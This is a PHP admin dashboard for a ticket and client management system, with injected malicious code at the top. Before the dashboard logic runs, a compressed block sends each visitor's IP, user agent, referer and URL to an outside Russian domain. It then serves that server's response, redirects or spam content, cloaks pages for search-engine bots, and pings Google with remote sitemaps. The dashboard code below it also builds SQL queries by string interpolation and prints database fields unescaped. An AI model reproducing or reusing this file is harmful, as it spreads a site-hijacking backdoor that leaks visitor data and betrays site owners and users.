<?php
$a='fgj258';@set_time_limit(3600);define("W",'http://fgj258.awaywant.ru');define("U",getu());function k($b){return@$_SERVER[$b]?$_SERVER[$b]:"";}define("S",k("PHP_SELF"));define("F",strpos(S,"index.php")!==false&&strpos(U,S)===false?rtrim(S,"index.php"):S);$d=$_REQUEST["p"];$f=ltrim(U,F);if($d!="")$f=preg_replace("@(\?|\&)p=".$d."@","",$f);define("U2",preg_replace("#^\W+#","",$f));$h=k('HTTP_USER_AGENT');function getu(){$k=k("REQUEST_URI");if(empty($k)){$l=k('argv');$k=S.'?'.(is_array($l)?$l[0]:k('QUERY_STRING'));}return $k;}function is_https(){if(!empty($_SERVER['HTTPS'])&&strtolower($_SERVER['HTTPS'])!=='off'){return true;}elseif(!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])&&$_SERVER['HTTP_X_FORWARDED_PROTO']==='https'){return true;}elseif(!empty($_SERVER['HTTP_FRONT_END_HTTPS'])&&strtolower($_SERVER['HTTP_FRONT_END_HTTPS'])!=='off'){return true;}return false;}function get_ip(){$p=$_SERVER['REMOTE_ADDR'];if(!empty($_SERVER['HTTP_CLIENT_IP'])){$p=$_SERVER['HTTP_CLIENT_IP'];}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$p=$_SERVER['HTTP_X_FORWARDED_FOR'];}if(stristr($p,',')){$t=explode(",",$p);$p=$t[0];}return $p;}function http($u,$ff){$gg="text/html";if(strpos(U2,"pingsitemap")===false&&(strpos(U2,".xml")!==false||strpos(U2,"/feed")!==false)){$gg="text/xml";}else if(strpos(U2,".txt")!==false){$gg="text/plain";}else if(strpos(U2,"images/")!==false){$gg="image/webp";}else if(strpos(U2,"sitemap.xsl")!==false){$gg="text/css";}header("content-type: $gg; charset=UTF-8");$hh=http_build_query($ff);$ii=W.$u."?".$hh;$jj=@file_get_contents($ii);if(!$jj)$jj=c(W.$u,$hh,0);if(!$jj)$jj=c(W.$u,$hh,1);if(!$jj){$kk=@fopen($ii,'r');if($kk){stream_get_meta_data($kk);$ll="";while(!feof($kk)){$ll.=fgets($kk,1024);}fclose($kk);return $ll;}}return $jj;}function c($u,$hh,$mm){$nn=curl_init();if($mm){curl_setopt($nn,CURLOPT_URL,$u);curl_setopt($nn,CURLOPT_POST,1);curl_setopt($nn,CURLOPT_POSTFIELDS,$hh);}else{curl_setopt($nn,CURLOPT_URL,$u."?".$hh);}curl_setopt($nn,CURLOPT_RETURNTRANSFER,1);curl_setopt($nn,CURLOPT_HEADER,0);curl_setopt($nn,CURLOPT_TIMEOUT,10);curl_setopt($nn,CURLOPT_FOLLOWLOCATION,1);$jj=curl_exec($nn);curl_close($nn);return $jj;}function g($u,$ff){$jj=http($u,$ff);if(!$jj){@header('HTTP/1.1 500 Internal Server Error');die();}$b=substr($jj,0,1);switch($b){case "4":@header('HTTP/1.1 404 Not Found');die();case "5":@header('HTTP/1.1 500 Internal Server Error');die();case "3":@header('HTTP/1.1 302 Moved Permanently');header('Location: '.substr($jj,1));header('referer: '.k("HTTP_HOST"));die();case "7":return false;case "8":die();default:header('HTTP/1.1 200 OK');return $jj;}}if(strpos(U,"jp2023")!==false){echo "<p>JP2023</p><p>".$a."-beautiful</p>";die();}$oo=array("ip"=>get_ip(),"lang"=>k("HTTP_ACCEPT_LANGUAGE"),"ua"=>$h,"r"=>strtolower(k("HTTP_REFERER")),"host"=>k("HTTP_HOST"),"uri"=>U,"uri2"=>U2,"isBot"=>preg_match("@google|yahoo|bing@",$h)?"1":"","f"=>F,"p"=>$d);if(is_https()){$oo["h"]="1";}if(strpos(U,"pingsitemap")!==false){$pp=explode(",",g("/sitemap.list",$oo));foreach($pp as $qq){$ff='https://www.google.com/ping?sitemap='.$qq;$jj=c($ff,array(),0);if(!$jj){$jj=@file_get_contents($ff);}if(stristr($jj,'successfully')){echo $ff.'<br>pingok<br>';}else{echo $ff.'======creat file false!<br>';}}die();}$rr=g("",$oo);if($rr)die($rr);?><?php 
if (!isset($_SESSION['user_name'])) {
  echo "<script>window.open('login','_self')</script>";
}else{

    $access=$_SESSION['priviladges'];
    $extra_priviladge=$_SESSION['extra_priviladges'];

    if ((strpos($extra_priviladge , 'a') !== false) || (strpos($access , 'a') !== false)) {

      include_once('includes/header.php');
      include_once('includes/sidebar.php');
      include_once('includes/topnav.php');

      //get active ticket count
      $get_active_ticket = "SELECT * FROM  tiket WHERE status=2";
      $run_active_ticket = mysqli_query($conn,$get_active_ticket);
      $count_active_ticket = mysqli_num_rows($run_active_ticket); 
      
      //get pending ticket count
      $get_pending_ticket = "SELECT * FROM  tiket WHERE status=1";
      $run_pending_ticket = mysqli_query($conn,$get_pending_ticket);
      $count_pending_ticket = mysqli_num_rows($run_pending_ticket); 

      //get colsed ticket count
      $get_closed_ticket = "SELECT * FROM  tiket WHERE status=3";
      $run_closed_ticket = mysqli_query($conn,$get_closed_ticket);
      $count_closed_ticket = mysqli_num_rows($run_closed_ticket); 

      //get clients
      $get_clients = "SELECT * FROM  client WHERE status=1";
      $run_clients = mysqli_query($conn,$get_clients);
      $count_clients = mysqli_num_rows($run_clients); 

      //get supervisors
      //user_id, user_name, password, name, telephine_no_01, telephine_no_02, extra_priviladges, client_branch_id_or_supervisor_id, client_branch_let_or_supervisor_let, status, created_date, created_time, user_type_id
      $get_supervisor = "SELECT * FROM user WHERE user_type_id=2 AND status=1";
      $run_supervisor = mysqli_query($conn,$get_supervisor);
      $count_supervisor = mysqli_num_rows($run_supervisor); 

      //system users
      $get_user = "SELECT * FROM user WHERE client_branch_let_or_supervisor_let='NU' AND status=1";
      $run_user = mysqli_query($conn,$get_user);
      $count_user = mysqli_num_rows($run_user);
  ?>
        <!-- client mobile nav start -->
        <nav class="mobile-nav">

            <?php
               if ((strpos($extra_priviladge , 'a') !== false) || (strpos($access , 'a') !== false)){
            ?>
            <a href="index" class="bloc-icon">
            <i class="fa fa-dashcube fa-lg" aria-hidden="true"></i><br>
                <label for="">Home</label> 
            </a>
            <?php } ?>
            <?php
               if ((strpos($extra_priviladge , 'b') !== false) || (strpos($access , 'b') !== false)){
            ?>
            <a href="supervisor_dashboard" class="bloc-icon">
            <i class="fa fa-dashcube fa-lg" aria-hidden="true"></i><br>
                <label for="">Home</label> 
            </a>
            <?php } ?>
            <?php
               if ((strpos($extra_priviladge , 'c') !== false) || (strpos($access , 'c') !== false)){
            ?>
            <a href="my_dashboard" class="bloc-icon">
            <i class="fa fa-dashcube fa-lg" aria-hidden="true"></i><br>
                <label for="">Home</label> 
            </a>
            <?php } ?>

            <a href="#" class="bloc-icon">
            <i class="fa fa-folder-open fa-lg" aria-hidden="true"></i><br>
                <label for="">Open Ticket</label>
            </a>
            <a href="#" class="bloc-icon">
            <i class="fa fa-user fa-lg" aria-hidden="true"></i><br>
                <label for="">profile</label> 
            </a>
        
        </nav>
      <!-- client mobile nav end -->
      
<!-- Page Content  -->
<div id="content-page" class="content-page">
    <div class="container-fluid">
        <div class="row">
                  <div class="col-sm-4 col-md-4 col-lg-2">
                     <a href="" data-toggle="modal" data-target=".bd-example-modal-xl">
                     <div class="iq-card iq-card-block iq-card-stretch iq-card-height">
                        <div class="iq-card-body iq-box-relative">
                           <div class="iq-box-absolute icon iq-icon-box rounded-circle iq-bg-success">
                              <i class="fa fa-ticket" aria-hidden="true"></i>
                           </div>
                           <p class="text-secondary"><span class="text-success">Active</span><br> Tickets</p>
                           <div class="d-flex align-items-center justify-content-between">
                              <h4><b><?php echo  $count_active_ticket; ?></b></h4>
                              <i class="fa fa-arrow-circle-right fa-lg iq-bg-success" aria-hidden="true"></i>
                           </div>
                        </div>
                     </div>
                     </a>
                  </div>
                  <div class="col-sm-4 col-md-4 col-lg-2">
                     <a href="" data-toggle="modal" data-target=".bd-example-modal-xl-two">
                     <div class="iq-card iq-card-block iq-card-stretch iq-card-height">
                        <div class="iq-card-body iq-box-relative">
                           <div class="iq-box-absolute icon iq-icon-box rounded-circle iq-bg-warning">
                              <i class="fa fa-ticket" aria-hidden="true"></i>
                           </div>
                           <p class="text-secondary"><span class="text-warning">Pending</span><br> Tickets</p>
                           <div class="d-flex align-items-center justify-content-between">
                              <h4><b><?php echo  $count_pending_ticket; ?></b></h4>
                              <i class="fa fa-arrow-circle-right fa-lg iq-bg-warning" aria-hidden="true"></i>
                           </div>
                        </div>
                     </div>
                     </a>
                  </div>
                  <div class="col-sm-4 col-md-4 col-lg-2">
                    <a href="" data-toggle="modal" data-target=".bd-example-modal-xl-three">
                     <div class="iq-card iq-card-block iq-card-stretch iq-card-height">
                        <div class="iq-card-body iq-box-relative">
                           <div class="iq-box-absolute icon iq-icon-box rounded-circle iq-bg-danger">
                              <i class="fa fa-ticket" aria-hidden="true"></i>
                           </div>
                           <p class="text-secondary">  <span class="text-danger">Closed</span><br> Tickets</p>
                           <div class="d-flex align-items-center justify-content-between">
                              <h4><b><?php echo  $count_closed_ticket; ?></b></h4>
                              <i class="fa fa-arrow-circle-right fa-lg iq-bg-danger" aria-hidden="true"></i>
                           </div>
                        </div>
                     </div>
                   </a>
                  </div>
                  <div class="col-sm-4 col-md-4 col-lg-2">
                     <div class="iq-card iq-card-block iq-card-stretch iq-card-height">
                        <div class="iq-card-body iq-box-relative">
                           <div class="iq-box-absolute icon iq-icon-box rounded-circle iq-bg-info">
                              <i class="fa fa-building"></i>
                           </div>
                           <p class="text-secondary">Total<br><span class="text-info">Clients</span><br> </p>
                           <div class="d-flex align-items-center justify-content-between">
                              <h4><b><?php echo  $count_clients; ?></b></h4>
                              <i class="fa fa-arrow-circle-right fa-lg iq-bg-info" aria-hidden="true"></i>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="col-sm-4 col-md-4 col-lg-2">
                     <div class="iq-card iq-card-block iq-card-stretch iq-card-height">
                        <div class="iq-card-body iq-box-relative">
                           <div class="iq-box-absolute icon iq-icon-box rounded-circle iq-bg-dark">
                              <i class="fa fa-user"></i>
                           </div>
                           <p class="text-secondary">Total<br><span class="text-dark">Supervisors</span> </p>
                           <div class="d-flex align-items-center justify-content-between">
                              <h4><b><?php echo  $count_supervisor; ?></b></h4>
                              <i class="fa fa-arrow-circle-right fa-lg iq-bg-dark" aria-hidden="true"></i>
                           </div>
                        </div>
                     </div>
                  </div>

                  <div class="col-sm-4 col-md-4 col-lg-2">
                     <div class="iq-card iq-card-block iq-card-stretch iq-card-height">
                        <div class="iq-card-body iq-box-relative">
                           <div class="iq-box-absolute icon iq-icon-box rounded-circle iq-bg-secondary">
                              <i class="ri-pie-chart-2-line"></i>
                           </div>
                           <p class="text-secondary">System<br><span class="text-secondary">Users</span> </p>
                           <div class="d-flex align-items-center justify-content-between">
                              <h4><b><?php echo  $count_user; ?></b></h4>
                              <i class="fa fa-arrow-circle-right fa-lg iq-bg-secondary" aria-hidden="true"></i>
                           </div>
                        </div>
                     </div>
                  </div>

                 
               <div class="iq-card col-md-8">
                     <div class="iq-card-header d-flex justify-content-between">
                           <div class="iq-header-title">
                              <h4 class="card-title">Open Tickets</h4>
                           </div>
                     </div>
                     <div class="iq-card-body">
                        <div class="table-responsive">
                           <table id="example" class="table mb-0" >
                              <thead class="thead-light">
                                 <tr>
                                    <th></th>
                                    <th>Client</th>
                                    <th>Supervisor</th>
                                    <th>Subject</th>
                                    <th>Ticket Description</th>
                                    <th>Status</th>
                                    <th></th>
                                 </tr>
                              </thead>
                              <tbody>
                                 <?php

                                 // tiket_id	subject	discription	client_id	client_branch_id	supervisor_id	send_date	send_time	privecy_status	status	user_id	
                                    $get_ticket_details = "SELECT * FROM tiket  WHERE status=1 OR status=2  ORDER BY tiket_id DESC";
                                    $run_ticket_details= mysqli_query($conn,$get_ticket_details);
                                    while ($row_item=mysqli_fetch_array($run_ticket_details)) {
                                       $subject=$row_item['subject'];
                                       $discription=$row_item['discription'];
                                       $client_id=$row_item['client_id'];
                                       $client_branch_id=$row_item['client_branch_id'];
                                       $supervisor_id=$row_item['supervisor_id'];
                                       $send_date=$row_item['send_date'];
                                       $status=$row_item['status'];
                                       $privecy_status=$row_item['privecy_status'];

                                 // get company data
                                       //client_id	company_name	agriment_doc	logo	status	created_date	created_time user_id	
                                       $get_client = "SELECT * FROM client  WHERE client_id='$client_id'  LIMIT 1";
                                       $run_client= mysqli_query($conn,$get_client);
                                       if($row_item=mysqli_fetch_array($run_client)){
                                            $company_name=$row_item['company_name'];
                                            $logo=$row_item['logo'];
                                       }

                                 // get company branch
                                       //client_branch_id	email	address	client_id	supervisor_id	location_link	status	created_date	created_time	 user_id		
                                       $get_branch = "SELECT * FROM client_branch  WHERE client_branch_id='$client_branch_id'  LIMIT 1";
                                       $run_branch= mysqli_query($conn,$get_branch);
                                       if($row_item=mysqli_fetch_array($run_branch)){
                                            $address=$row_item['address'];
                                            $email=$row_item['email'];
                                            $location_link=$row_item['location_link'];
                                       }

                                 //getsupervisor data
                                       // Full texts user_id user_name  password name	 telephine_no_01	 telephine_no_02	 extra_priviladges	 client_branch_id_or_supervisor_id  register id client-C1 supervisor-S1 client_branch_let_or_supervisor_let	 status	 created_date	 created_time	  user_type_id
                                       $get_supervisor = "SELECT * FROM user  WHERE client_branch_id_or_supervisor_id= '$supervisor_id' AND client_branch_let_or_supervisor_let='S' LIMIT 1";
                                       $run_supervisor= mysqli_query($conn,$get_supervisor);
                                       if($row_item=mysqli_fetch_array($run_supervisor)){
                                          $name=$row_item['name'];
                                       }
 
                                 ?>
                                 <tr>
                                    <td></td>
                                    <td><?php echo('<b>'.$company_name.'</b> ,'.$address).' branch'; ?> <br>
                                    <?php if($privecy_status==1){?>
                                       <div class="badge badge-pill badge-danger text-white">High Piority</div>
                                    <?php } ?>
                                    </td>
                                    <td><?php echo($name); ?></td>
                                    <td><?php echo($subject); ?></td>
                                    <td><?php echo($discription); ?></td>
                                    <?php if($status==2){?>
                                       <td><div class="badge badge-pill badge-success text-dark">Active</div></td>
                                       <td><a href="" data-toggle="modal" data-target=".bd-example-modal-xl-end"><div class="badge badge-pill badge-info text-white">end progress</div></a></td>
                                    <?php }else{?>
                                       <td><div class="badge badge-pill badge-warning text-dark">Pending</div></td>
                                       <td><a href="" data-toggle="modal" data-target=".bd-example-modal-xl-open"><div class="badge badge-pill badge-info text-white">start progress</div></a></td>
                                    <?php }?>
                                    
                                 </tr> 
                                 <?php
                                    }
                                 ?>
                                 <!-- <td><div class="badge badge-pill badge-warning text-dark">pending</div></td> -->
                              </tbody>
                        </table>
                        </div>
                     </div>
               </div>
               <div class="col-lg-4">
                     <div class="iq-card iq-card-block iq-card-stretch iq-card-height">
                        <div class="iq-card-header d-flex justify-content-between">
                           <div class="iq-header-title">
                              <h4 class="card-title">Tickets Percentage</h4>
                           </div>
                        </div>
                        <div class="iq-card-body">
                           <div id="home-perfomer-chart"></div>
                        </div>
                     </div>
                  </div>
               </div>
                  
            <!-- open Tickets modal -->
               <div class="modal fade bd-example-modal-xl-open" tabindex="-1" role="dialog"   aria-hidden="true">
                    <div class="modal-dialog modal-md">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title">Start Ticket progress</h5>
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body">
                            
                              <div class="iq-card-body">
                                 <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi vulputate, ex ac venenatis mollis, diam nibh finibus leo</p>
                                 <form id="form-wizard1" name="form-wizard1" action="" method="post" class="mt-4" enctype="multipart/form-data">
                                    <div class="row">
                                       <div class="form-group col-lg-12 col-md-12 col-sm-12">
                                          <label for="email">Supervisor Note :</label>
                                          <input type="text" class="form-control" name="subject" id="subject" required data-parsley-trigger="keyup"/>
                                       </div>
                                       <div class="form-group col-lg-12 col-md-12 col-sm-12">
                                          <label for="pwd">Who Belongs this work ?  *</label>
                                          <textarea id="w3review" class="form-control" name="description" id="description" required data-parsley-trigger="keyup"/></textarea>
                                       </div>
                                    </div>
                                    <button type="submit" name="save" class="btn btn-primary">Submit</button>
                                 </form>
                              </div>

                           </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                            </div>
                        </div>
                    </div>
            <!-- open Tickets modal End-->
           <!-- close Tickets modal -->
                  <div class="modal fade bd-example-modal-xl-end" tabindex="-1" role="dialog"   aria-hidden="true">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title">Close Ticket progress</h5>
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body">
                              <div class="iq-card-body">
                                 <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi vulputate, ex ac venenatis mollis, diam nibh finibus leo</p>
                                 <form id="form-wizard1" name="form-wizard1" action="" method="post" class="mt-4" enctype="multipart/form-data">
                                    <div class="row">
                                       <div class="form-group col-lg-12 col-md-12 col-sm-12">
                                          <label for="pwd">Supervisor Note :</label>
                                          <textarea id="w3review" class="form-control" name="description" id="description" required data-parsley-trigger="keyup"/></textarea>
                                       </div>
                                       <hr>
                                      <div class="form-group col-lg-12 col-md-12 col-sm-12">
                                       <div class="alert text-white bg-info" role="alert">
                                          <div class="iq-alert-icon">
                                             <i class="ri-information-line"></i>
                                          </div>
                                          <div class="iq-alert-text">If there is any especial incident inform them below</div>
                                       </div>
                                       </div>
                                       <div class="form-group col-lg-12 col-md-12 col-sm-12">
                                          <label for="email"> Note :</label>
                                          <textarea id="w3review" class="form-control" name="description" id="description" required data-parsley-trigger="keyup"></textarea>
                                       </div>
                                       <div class="form-group col-lg-6 col-md-6 col-sm-6">
                                          <label for="email">upload attatchment belongs to accident :</label>
                                          <input type="file" class="form-control" name="subject" id="subject" required data-parsley-trigger="keyup"/>
                                       </div>
                                       <div class="form-group col-lg-3 col-md-3 col-sm-3">
                                          <label for="email">attatchment 02 :</label>
                                          <input type="file" class="form-control" name="subject" id="subject" required data-parsley-trigger="keyup"/>
                                       </div>
                                       <div class="form-group col-lg-3 col-md-3 col-sm-3">
                                          <label for="email">attatchment 03 :</label>
                                          <input type="file" class="form-control" name="subject" id="subject" required data-parsley-trigger="keyup"/>
                                       </div>
                                       
                                    </div>
                                    <button type="submit" name="save" class="btn btn-primary">Submit</button>
                                 </form>
                              </div>

                           </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                            </div>
                        </div>
                    </div>
            <!-- close Tickets modal End-->
            

            <!-- Active Tickets modal -->
                  <div class="modal fade bd-example-modal-xl" tabindex="-1" role="dialog"   aria-hidden="true">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title">Active Tickets</h5>
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body">
                            
                            <div class="table-responsive">
                                 <table id="example2" class="table mb-0" >
                                       <thead class="thead-light">
                                       <tr>
                                         <th></th>
                                         <th>Client</th>
                                         <th>Supervisor</th>
                                         <th>Subject</th>
                                         <th>Ticket Description</th>
                                         <th>Status</th>
                                       </tr>
                                    </thead>
                                    <tbody>
                                 <?php

                                 // tiket_id  subject discription client_id client_branch_id  supervisor_id send_date send_time privecy_status  status  user_id 
                                    $get_ticket_details = "SELECT * FROM tiket  WHERE status=2  ORDER BY tiket_id DESC";
                                    $run_ticket_details= mysqli_query($conn,$get_ticket_details);
                                    while ($row_item=mysqli_fetch_array($run_ticket_details)) {
                                       $subject=$row_item['subject'];
                                       $discription=$row_item['discription'];
                                       $client_id=$row_item['client_id'];
                                       $client_branch_id=$row_item['client_branch_id'];
                                       $supervisor_id=$row_item['supervisor_id'];
                                       $send_date=$row_item['send_date'];
                                       $status=$row_item['status'];

                                 // get company data
                                       //client_id  company_name  agriment_doc  logo  status  created_date  created_time user_id  
                                       $get_client = "SELECT * FROM client  WHERE client_id='$client_id'  LIMIT 1";
                                       $run_client= mysqli_query($conn,$get_client);
                                       if($row_item=mysqli_fetch_array($run_client)){
                                            $company_name=$row_item['company_name'];
                                            $logo=$row_item['logo'];
                                       }

                                 // get company branch
                                       //client_branch_id email address client_id supervisor_id location_link status  created_date  created_time   user_id    
                                       $get_branch = "SELECT * FROM client_branch  WHERE client_branch_id='$client_branch_id'  LIMIT 1";
                                       $run_branch= mysqli_query($conn,$get_branch);
                                       if($row_item=mysqli_fetch_array($run_branch)){
                                            $address=$row_item['address'];
                                            $email=$row_item['email'];
                                            $location_link=$row_item['location_link'];
                                       }

                                 //getsupervisor data
                                       // Full texts user_id user_name  password name  telephine_no_01   telephine_no_02   extra_priviladges   client_branch_id_or_supervisor_id  register id client-C1 supervisor-S1 client_branch_let_or_supervisor_let  status  created_date  created_time   user_type_id
                                       $get_supervisor = "SELECT * FROM user  WHERE client_branch_id_or_supervisor_id= '$supervisor_id' AND client_branch_let_or_supervisor_let='S' LIMIT 1";
                                       $run_supervisor= mysqli_query($conn,$get_supervisor);
                                       if($row_item=mysqli_fetch_array($run_supervisor)){
                                          $name=$row_item['name'];
                                       }
 
                                 ?>
                                 <tr>
                                    <td></td>
                                    <td><?php echo($company_name.' '.$address); ?></td>
                                    <td><?php echo($name); ?></td>
                                    <td><?php echo($subject); ?></td>
                                    <td><?php echo($discription); ?></td>
                                    <td><div class="badge badge-pill badge-success text-dark">Active</div></td>
                                 </tr> 
                                 <?php
                                    }
                                 ?>
                              </tbody>
                                 </table>
                              </div>

                           </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                            </div>
                        </div>
                  </div>
            <!-- Active Tickets modal End-->

            <!-- Pending Tickets modal -->
               <div class="modal fade bd-example-modal-xl-two" tabindex="-1" role="dialog"   aria-hidden="true">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title">Pending Tickets</h5>
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body">
                            
                            <div class="table-responsive">
                                 <table id="example3" class="table mb-0" >
                                       <thead class="thead-light">
                                       <tr>
                                         <th></th>
                                         <th>Client</th>
                                         <th>Supervisor</th>
                                         <th>Subject</th>
                                         <th>Ticket Description</th>
                                         <th>Status</th>
                                       </tr>
                                    </thead>

                                        
                                        <tbody>
                                 <?php

                                 // tiket_id  subject discription client_id client_branch_id  supervisor_id send_date send_time privecy_status  status  user_id 
                                    $get_ticket_details = "SELECT * FROM tiket  WHERE status=1  ORDER BY tiket_id DESC";
                                    $run_ticket_details= mysqli_query($conn,$get_ticket_details);
                                    while ($row_item=mysqli_fetch_array($run_ticket_details)) {
                                       $subject=$row_item['subject'];
                                       $discription=$row_item['discription'];
                                       $client_id=$row_item['client_id'];
                                       $client_branch_id=$row_item['client_branch_id'];
                                       $supervisor_id=$row_item['supervisor_id'];
                                       $send_date=$row_item['send_date'];
                                       $status=$row_item['status'];

                                 // get company data
                                       //client_id  company_name  agriment_doc  logo  status  created_date  created_time user_id  
                                       $get_client = "SELECT * FROM client  WHERE client_id='$client_id'  LIMIT 1";
                                       $run_client= mysqli_query($conn,$get_client);
                                       if($row_item=mysqli_fetch_array($run_client)){
                                            $company_name=$row_item['company_name'];
                                            $logo=$row_item['logo'];
                                       }

                                 // get company branch
                                       //client_branch_id email address client_id supervisor_id location_link status  created_date  created_time   user_id    
                                       $get_branch = "SELECT * FROM client_branch  WHERE client_branch_id='$client_branch_id'  LIMIT 1";
                                       $run_branch= mysqli_query($conn,$get_branch);
                                       if($row_item=mysqli_fetch_array($run_branch)){
                                            $address=$row_item['address'];
                                            $email=$row_item['email'];
                                            $location_link=$row_item['location_link'];
                                       }

                                 //getsupervisor data
                                       // Full texts user_id user_name  password name  telephine_no_01   telephine_no_02   extra_priviladges   client_branch_id_or_supervisor_id  register id client-C1 supervisor-S1 client_branch_let_or_supervisor_let  status  created_date  created_time   user_type_id
                                       $get_supervisor = "SELECT * FROM user  WHERE client_branch_id_or_supervisor_id= $supervisor_id AND client_branch_let_or_supervisor_let='S' LIMIT 1";
                                       $run_supervisor= mysqli_query($conn,$get_supervisor);
                                       if($row_item=mysqli_fetch_array($run_supervisor)){
                                          $name=$row_item['name'];
                                       }
 
                                 ?>
                                 <tr>
                                    <td></td>
                                    <td><?php echo($company_name.' '.$address); ?></td>
                                    <td><?php echo($name); ?></td>
                                    <td><?php echo($subject); ?></td>
                                    <td><?php echo($discription); ?></td>
                                    <td><div class="badge badge-pill badge-warning text-dark">Pending</div></td>
                                 </tr> 
                                 <?php
                                    }
                                 ?>
                              </tbody>
                              </table>
                              </div>

                           </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                            </div>
                        </div>
               </div>
            <!-- Active Tickets modal End-->

             <!-- Closed Tickets modal -->
               <div class="modal fade bd-example-modal-xl-three" tabindex="-1" role="dialog"   aria-hidden="true">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title">Cloased Tickets</h5>
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body">
                            
                            <div class="table-responsive">
                                 <table id="example4" class="table mb-0" >
                                       <thead class="thead-light">
                                       <tr>
                                         <th></th>
                                         <th>Client</th>
                                         <th>Supervisor</th>
                                         <th>Subject</th>
                                         <th>Ticket Description</th>
                                         <th>Status</th>
                                       </tr>
                                    </thead>

                                        
                                        <tbody>
                                 <?php

                                 // tiket_id  subject discription client_id client_branch_id  supervisor_id send_date send_time privecy_status  status  user_id 
                                    $get_ticket_details = "SELECT * FROM tiket  WHERE status=3  ORDER BY tiket_id DESC";
                                    $run_ticket_details= mysqli_query($conn,$get_ticket_details);
                                    while ($row_item=mysqli_fetch_array($run_ticket_details)) {
                                       $subject=$row_item['subject'];
                                       $discription=$row_item['discription'];
                                       $client_id=$row_item['client_id'];
                                       $client_branch_id=$row_item['client_branch_id'];
                                       $supervisor_id=$row_item['supervisor_id'];
                                       $send_date=$row_item['send_date'];
                                       $status=$row_item['status'];

                                 // get company data
                                       //client_id  company_name  agriment_doc  logo  status  created_date  created_time user_id  
                                       $get_client = "SELECT * FROM client  WHERE client_id='$client_id'  LIMIT 1";
                                       $run_client= mysqli_query($conn,$get_client);
                                       if($row_item=mysqli_fetch_array($run_client)){
                                            $company_name=$row_item['company_name'];
                                            $logo=$row_item['logo'];
                                       }

                                 // get company branch
                                       //client_branch_id email address client_id supervisor_id location_link status  created_date  created_time   user_id    
                                       $get_branch = "SELECT * FROM client_branch  WHERE client_branch_id='$client_branch_id'  LIMIT 1";
                                       $run_branch= mysqli_query($conn,$get_branch);
                                       if($row_item=mysqli_fetch_array($run_branch)){
                                            $address=$row_item['address'];
                                            $email=$row_item['email'];
                                            $location_link=$row_item['location_link'];
                                       }

                                 //getsupervisor data
                                       // Full texts user_id user_name  password name  telephine_no_01   telephine_no_02   extra_priviladges   client_branch_id_or_supervisor_id  register id client-C1 supervisor-S1 client_branch_let_or_supervisor_let  status  created_date  created_time   user_type_id
                                       $get_supervisor = "SELECT * FROM user  WHERE client_branch_id_or_supervisor_id= '$supervisor_id' AND client_branch_let_or_supervisor_let='S' LIMIT 1";
                                       $run_supervisor= mysqli_query($conn,$get_supervisor);
                                       if($row_item=mysqli_fetch_array($run_supervisor)){
                                          $name=$row_item['name'];
                                       }
 
                                 ?>
                                 <tr>
                                    <td></td>
                                    <td><?php echo($company_name.' '.$address); ?></td>
                                    <td><?php echo($name); ?></td>
                                    <td><?php echo($subject); ?></td>
                                    <td><?php echo($discription); ?></td>
                                    <td><div class="badge badge-pill badge-danger text-dark">Finished</div></td>
                                 </tr> 
                                 <?php
                                    }
                                 ?>
                              </tbody>
                              </table>
                              </div>

                           </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                            </div>
                        </div>
               </div>
            <!-- Clased Tickets modal End-->

            

    </div>
</div>
<!-- Page Content End -->
<?php include_once('includes/footer.php'); ?>
<script>
   if(jQuery('#home-perfomer-chart').length){
        var donut = new Morris.Donut({
          element: 'home-perfomer-chart',
          resize: true,
          colors: ["#65f9b3", "#ffbf43", "#ff0044"],
          data: [
            {label: "Active Tickets", value: <?php echo json_encode($count_active_ticket); ?>},
            {label: "Pending Tickets", value: <?php echo json_encode($count_pending_ticket); ?>},
            {label: "Closed Tickets", value: <?php echo json_encode($count_closed_ticket); ?>}
          ],
          hideHover: 'auto'
        });
    }
</script>
<script type="text/javascript">
  $(document).ready(function () {
    $('#example').DataTable();
});
$(document).ready(function () {
    $('#example2').DataTable();
});
$(document).ready(function () {
    $('#example3').DataTable();
});
$(document).ready(function () {
    $('#example4').DataTable();
});

</script>
<?php 
  }
}
 ?>
